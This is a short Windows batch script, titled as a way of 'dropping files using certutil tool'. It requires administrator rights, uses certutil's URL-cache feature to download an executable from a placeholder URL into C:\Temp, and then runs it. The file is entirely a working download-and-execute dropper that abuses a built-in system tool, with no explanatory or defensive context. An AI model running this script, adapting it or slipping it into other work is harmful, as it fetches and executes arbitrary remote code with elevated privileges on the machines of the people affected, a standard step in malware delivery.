@echo off
Title dropping files using certutil tool
Color A
:: Check for Administrator rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo "Please run this script as Administrator."
    pause
    exit /b
)
:: Define the URL and the drop location
set "url=https://example.com/file.exe"
set "dropLocation=C:\Temp\dropped_file.exe"

:: Create the drop location folder if it doesn't exist
if not exist C:\Temp (
    mkdir C:\Temp
)

:: Use certutil to download the file
echo Downloading file using certutil...
certutil -urlcache -split -f %url% %dropLocation%
Color E
:: Check if the file was downloaded
if exist %dropLocation% (
    echo File downloaded successfully.
    echo Executing the file...
    start %dropLocation%
) else (
    echo Failed to download the file.
)

pause